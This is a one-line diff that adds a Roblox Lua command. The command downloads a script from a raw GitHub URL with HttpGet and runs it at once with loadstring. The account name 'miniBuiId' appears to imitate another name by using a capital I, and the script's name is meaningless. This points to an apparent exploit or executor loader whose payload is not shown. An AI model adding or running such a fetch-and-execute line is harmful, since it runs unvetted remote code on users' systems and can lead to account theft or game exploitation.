@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/miniBuiId/fe/refs/heads/main/pradzuhss'))()
